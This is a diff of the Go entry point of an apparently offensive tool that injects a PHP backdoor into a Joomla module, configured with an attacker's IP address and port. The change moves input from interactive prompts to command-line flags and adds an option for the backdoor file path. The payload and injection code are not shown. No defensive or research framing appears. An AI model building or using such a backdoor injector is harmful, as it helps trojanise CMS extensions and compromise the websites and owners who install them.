@@ -1,43 +1,34 @@
 package main
 
 import (
+    "flag"
     "fmt"
 
     "data"
     "internals"
-    "utils"
 )
 
-var banner string = `
-.     |___________________________________
-|-----|- - -|''''|''''|''''|''''|''''|'##\|__
-|- -  |  cc 6    5    4    3    2    1 ### __]==----------------------
-|-----|________________________________##/|
-'     |"""""""""""""""""""""""""""""""""""
-`
+const reset = "\033[0m"
+const red = "\033[31m"
+const green = "\033[32m"
 
 func main() {
-    var addr data.Address
+    var addr data.Address 
+    var backdoorPath string
     var modulePath string
 
-    utils.Print(data.Green, banner)
-    fmt.Println()
-
-    utils.Print(data.Blue, "[+] Type your ip address => ")
-    fmt.Scan(&addr.Ip)
-
-    utils.Print(data.Blue, "[+] Type your port => ")
-    fmt.Scan(&addr.Port)
-
-    utils.Print(data.Blue, "[+] Type the path to your decompressed Joomla module => ")
-    fmt.Scan(&modulePath)
+    flag.StringVar(&addr.Ip, "ip", "", "your ip address")
+    flag.IntVar(&addr.Port, "port", 0, "your port")
+    flag.StringVar(&modulePath, "path", "", "path to your decompressed Joomla module")
+    flag.StringVar(&backdoorPath, "backdoor", "./backdoor.php", "path to backdoor file")
+    flag.Parse()
     
-    err := internals.Inject(addr, modulePath)
+    err := internals.Inject(addr, backdoorPath, modulePath)
     if err != nil {
-        utils.Print(data.Red, "[-] Error injecting backdoor: %s", err)
+        fmt.Print(red, "[-] Error injecting backdoor: ", err)
     } else {
-        utils.Print(data.Green, "[+] Backdoor injected successfully")
+        fmt.Print(green, "[+] Backdoor injected successfully")
     }
 
-    fmt.Println()
+    fmt.Println(reset)
 }
